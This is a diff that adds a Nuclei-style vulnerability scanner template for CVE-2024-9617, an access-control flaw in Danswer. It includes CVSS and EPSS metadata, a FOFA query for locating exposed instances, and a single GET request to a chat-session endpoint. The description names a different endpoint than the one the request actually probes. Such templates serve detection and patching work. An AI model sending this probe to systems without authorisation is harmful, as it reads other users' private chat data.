@@ -1,0 +1,39 @@
+id: CVE-2024-9617
+
+info:
+  name: "Danswer 未验证文件创建者导致 IDOR 漏洞"
+  author: s4e-io
+  severity: medium
+  description: |
+    The application does not verify whether the attacker is the creator of the file, allowing the attacker to directly call the GET /api/chat/file/{file_id} interface to view any user's file.
+  reference:
+    - https://huntr.com/bounties/8f683ff6-3a99-41c6-b763-a8f7b73bd146
+    - https://github.com/danswer-ai/danswer
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 6.5
+    cve-id: CVE-2024-9617
+    cwe-id: CWE-284
+    epss-score: 0.24863
+    epss-percentile: 0.95809
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: danswer-ai
+    product: danswer
+    fofa-query: icon_hash="484766002"
+  tags: danswer
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/chat/get-chat-session/1?is_shared=True"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body, "chat_session_id", "description", "persona_id")'
+          - 'contains(content_type, "application/json")'
+          - 'status_code == 200'
+        condition: and
+# digest: 4b0a00483046022100a5553a188d993d488ec960472998b5359decec72787dca46309a909877e43146022100d27bb8ddefedf506e43d0c04d2531561b44b8aacfd0a53f523963f81bf6b807c:922c64590222798bb761d5b6d8e72950
